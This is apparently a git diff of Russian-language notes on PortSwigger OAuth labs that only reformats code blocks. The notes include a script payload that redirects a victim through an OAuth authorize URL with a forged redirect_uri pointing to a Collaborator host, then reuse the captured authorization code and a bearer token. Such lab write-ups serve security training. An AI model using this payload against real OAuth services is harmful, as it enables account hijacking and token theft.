@@ -646,11 +646,11 @@ https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linkin
 https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri
 
 1. Создаём нагрузку с поддельным `redirect_uri`:
-   ```html
-   <script>
-window.location="https://oauth-YOUR-OAUTH-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-COLLABORATOR-ID.oastify.com&response_type=code&scope=openid%20profile%20email"
-</script>
-   ```
+   >```html
+   ><script>
+   >window.location="https://oauth-YOUR-OAUTH-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-COLLABORATOR-ID.oastify.com&response_type=code&scope=openid%20profile%20email"
+   ></script>
+   >```
 2. Получаем код доступа через перехваченный код авторизации: 
    ```
    https://{YOUR-LAB-ID}.web-security-academy.net/oauth-callback?code={AUTH-CODE}
@@ -667,9 +667,10 @@ https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-token
 2. Данные пользователя запрашиваются по следующей API точке:
    > ```http
    > GET /me HTTP/2
-Host: oauth-YOUR-OAUTH-ID.oauth-server.net
-Authorization: Bearer YOUR-BEARER-TOKEN
+   > Host: oauth-YOUR-OAUTH-ID.oauth-server.net
+   > Authorization: Bearer YOUR-BEARER-TOKEN
    > ```
+   > 
    > Ответ:
    > ```json
    > {
